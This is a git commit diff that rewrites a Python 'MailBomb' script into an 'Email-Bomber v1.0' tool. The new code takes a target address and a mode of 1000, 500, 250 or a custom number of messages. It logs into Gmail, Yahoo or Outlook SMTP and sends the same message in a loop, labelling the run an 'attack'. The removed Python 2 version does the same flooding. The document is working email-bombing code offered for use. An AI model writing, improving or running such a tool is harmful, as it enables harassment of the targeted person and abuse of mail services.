0402dd55369be2ab4372e43785fe612e7098017a
tekashiZiinMaKer <98004421+tekashiZiinMaKer@users.noreply.github.com>
2022-07-11 21:11:18 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,59 +1,130 @@
-#!/usr/bin/python 2.7
+#// Don't forget to hit SUBSCRIBE, COMMENT, LIKE, SHARE! and LEARN... :)
+# But srsly, hit that sub button so you don't miss out on more content! 
 
-import os
+
+'''imports'''
 import smtplib
-import getpass
 import sys
-import time
-
-os.system('pkg install figlet')
-os.system('clear')
-os.system('figlet MailBomb')
 
 
-print '    '
-email = raw_input('add your Email: ')
-print '             '
-user = raw_input('your name: ')
-print '      '
-passwd = getpass.getpass('your password: ')
-
-print '   '
-
-to = raw_input('\nTo: ')
+class bcolors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
 
 
-print '    '
+def banner():
+    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
+    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
+    print(bcolors.GREEN + '''
+                     \|/
+                       `--+--'
+                          |
+                      ,--'#`--.
+                      |#######|
+                   _.-'#######`-._
+                ,-'###############`-.
+              ,'#####################`,                 .__         .
+             |#########################|                [__) _ ._ _ |_  _ ._.
+            |###########################|               [__)(_)[ | )[_)(/,[
+           |#############################|
+           |#############################|              Author: tekashiZiin
+           |#############################|
+            |###########################|
+             \#########################/
+              `.#####################,'
+                `._###############_,'
+                   `--..#####..--'                                 ,-.--.
+*.______________________________________________________________,' (Bomb)
+                                                                    `--' ''')
 
-body = raw_input('Message: ')
 
-print '    '
+class Email_Bomber:
+    count = 0
 
-total = input('Number of send: ')
+    def __init__(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
+            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
+            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
+            if int(self.mode) > int(4) or int(self.mode) < int(1):
+                print('ERROR: Invalid Option. GoodBye.')
+                sys.exit(1)
+        except Exception as e:
+            print(f'ERROR: {e}')
 
-smtp_server = 'smtp.gmail.com'
-port = 587
+    def bomb(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
+            self.amount = None
+            if self.mode == int(1):
+                self.amount = int(1000)
+            elif self.mode == int(2):
+                self.amount = int(500)
+            elif self.mode == int(3):
+                self.amount = int(250)
+            else:
+                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
+            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def email(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
+            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
+            premade = ['1', '2', '3']
+            default_port = True
+            if self.server not in premade:
+                default_port = False
+                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
+
+            if default_port == True:
+                self.port = int(587)
+
+            if self.server == '1':
+                self.server = 'smtp.gmail.com'
+            elif self.server == '2':
+                self.server = 'smtp.mail.yahoo.com'
+            elif self.server == '3':
+                self.server = 'smtp-mail.outlook.com'
+
+            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
+            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
+            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
+            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
+
+            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+            ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+            self.s = smtplib.SMTP(self.server, self.port)
+            self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.fromAddr, self.fromPwd)
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def send(self):
+        try:
+            self.s.sendmail(self.fromAddr, self.target, self.msg)
+            self.count +=1
+            print(bcolors.YELLOW + f'BOMB: {self.count}')
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def attack(self):
+        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+        for email in range(self.amount+1):
+            self.send()
+        self.s.close()
+        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        sys.exit(0)
 
 
-print ''
-
-try:
-    server = smtplib.SMTP(smtp_server,port)
-    server.ehlo()
-    server.starttls()
-    server.login(email,passwd)
-    for i in range(1, total+1):
-        subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
-        server.sendmail(email,to,msg)
-        print "\rE-mails sent: %i" % i
-        time.sleep(1)
-        sys.stdout.flush()
-    server.quit()
-    print '\n Done !!!'
-except KeyboardInterrupt:
-    print '[-] Canceled'
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print '\n[!] The username or password you entered is incorrect.'
-    sys.exit()
+if __name__=='__main__':
+    banner()
+    bomb = Email_Bomber()
+    bomb.bomb()
+    bomb.email()
+    bomb.attack()
